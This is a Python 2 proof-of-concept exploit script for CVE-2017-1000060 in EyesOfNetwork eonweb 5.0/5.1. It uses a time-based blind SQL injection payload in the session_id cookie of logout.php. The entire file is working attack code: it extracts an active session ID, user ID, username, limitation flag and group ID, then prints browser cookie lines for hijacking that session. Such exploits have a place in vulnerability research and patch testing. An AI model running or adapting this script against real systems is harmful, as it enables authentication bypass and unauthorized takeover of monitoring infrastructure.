#!/usr/bin/python

'''
@cveid      2017-1000060
@scope      eonweb 5.0/5.1 (https://github.com/EyesOfNetworkCommunity/eonweb)
@author     iansus

Authentication bypass on EyesOfNetwork web due to DELETE time-based SQL injection in cookie session_id in logout.php 

'''

import requests
import sys
import time

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def myprint(s):
    sys.stdout.write(s)
    sys.stdout.flush()


def attack(r, uri, cookies):
    s = time.time()
    # print '%s\n\tsession_id=[ %s ]' % (r+uri, cookies)
    
    r = requests.get(r+uri, verify=False, cookies={'session_id':cookies})
    t = time.time()-s
    # print '\t%f\n' % t
    
    return (t, r.content)


REF_TIME = 1

if __name__=='__main__':

    if len(sys.argv)<2:    
        print 'Usage: %s <url> [time_threshold]' % sys.argv[0]
        sys.exit(1)
        
    ROOT = sys.argv[1]
    TIME = 1 if len(sys.argv)<3 else int(sys.argv[2])
    
    myprint('[-] Testing time attack... ')
    t,c = attack(ROOT, '/logout.php', "wavestone' OR (SELECT CASE WHEN (1) THEN SLEEP(%d) ELSE 1 END)=1337#" % TIME)
    assert t>=1, 'No time attack here...'
    myprint('OK\n')
    
    i = 0
    
    
    # SESSION LENGTH
    index = 0
    test = 0
    myprint('[-] Searching for session #%d len: ' % index)
    while True:
        t,c = attack(ROOT, 
            '/logout.php',
            "wavestone' OR (SELECT CASE WHEN ((SELECT LENGTH(session_id) FROM DUAL ORDER BY session_id LIMIT %d, 1)=%d) THEN SLEEP(%d) ELSE 1 END)=1337#" % (index, test, TIME))
            
        if t >= TIME:
            LENGTH = test
            break
            
        test += 1
            
    myprint('%d\n' % LENGTH)
    
    
    # SESSION 
    myprint('[-] Dumping session #%d: ' % index)
    SESSION=''
    for i in range(LENGTH):
    
        found = False
        for j in range(10):
            t,c = attack(ROOT, 
                '/logout.php',
                "wavestone' OR (SELECT CASE WHEN ((SELECT MID(session_id, %d, 1) FROM DUAL ORDER BY session_id LIMIT %d, 1)='%d') THEN SLEEP(%d) ELSE 1 END)=1337#" % (i+1, index, j, TIME))
                
            if t >= TIME:
                myprint('%d' % j)
                SESSION += '%d'%j
                found=True
                break
                
        if not found:
            myprint('-')
    myprint('\n')
    
    
    # USER ID
    myprint('[-] Dumping session #%d user_id: ' % index)
    test = 1
    while True:
        t,c = attack(ROOT, 
            '/logout.php',
            "wavestone' OR (SELECT CASE WHEN ((SELECT user_id FROM DUAL ORDER BY session_id LIMIT %d, 1)=%d) THEN SLEEP(%d) ELSE 1 END)=1337#" % (index, test, TIME))
            
        if t >= TIME:
            UID = test
            break
            
        test += 1
            
    myprint('%d\n' % UID)
    
    
    # USERNAME LENGTH
    myprint('[-] Dumping session #%d len(user_name): ' % index)
    test = 0
    while True:
        t,c = attack(ROOT, 
            '/logout.php',
            "wavestone' OR (SELECT CASE WHEN ((SELECT LENGTH(user_name) FROM users WHERE user_id=%d)=%d) THEN SLEEP(%d) ELSE 1 END)=1337#" % (UID, test, TIME))
            
        if t >= TIME:
            ULENGTH = test
            break
            
        test += 1
            
    myprint('%d\n' % ULENGTH)
    
    
    # USERNAME
    myprint('[-] Dumping session #%d user_name: ' % index)
    USERNAME=''
    for i in range(ULENGTH):
    
        binary = ''
        
        for j in range(8):
            t,c = attack(ROOT, 
                '/logout.php',
                "wavestone' OR (SELECT CASE WHEN ((SELECT MID(LPAD(BIN(ORD(MID(user_name, %d, 1))), 8, '0'), %d, 1) FROM users WHERE user_id=%d)='1') THEN SLEEP(%d) ELSE 1 END)=1337#" % (i+1, j+1, UID, TIME))
                
            if t >= TIME:
                binary+='1'
            else:
                binary+='0'
                
        myprint(chr(int(binary, 2)))
        USERNAME+=chr(int(binary, 2))
        
    myprint('\n')
    
    
    # USERNAME LIMITATION
    myprint('[-] Dumping session #%d user_limitation: ' % index)
    test = 0
    while True:
        t,c = attack(ROOT, 
            '/logout.php',
            "wavestone' OR (SELECT CASE WHEN ((SELECT user_limitation FROM users WHERE user_id=%d)=%d) THEN SLEEP(%d) ELSE 1 END)=1337#" % (UID, test, TIME))
            
        if t >= TIME:
            LIMIT = test
            break
            
        test += 1
            
    myprint('%d\n' % LIMIT)
    
    
    # USER GROUP
    myprint('[-] Dumping session #%d group_id: ' % index)
    test = 0
    while True:
        t,c = attack(ROOT, 
            '/logout.php',
            "wavestone' OR (SELECT CASE WHEN ((SELECT group_id FROM users WHERE user_id=%d)=%d) THEN SLEEP(%d) ELSE 1 END)=1337#" % (UID, test, TIME))
            
        if t >= TIME:
            GID = test
            break
            
        test += 1
            
    myprint('%d\n' % GID)
    
    print '\n\n'
    print 'document.cookie="session_id=%s"' % SESSION
    print 'document.cookie="user_name=%s"' % USERNAME
    print 'document.cookie="user_id=%d"' %UID
    print 'document.cookie="user_limitation=%d"' % LIMIT
    print 'document.cookie="group_id=%d"'% GID
    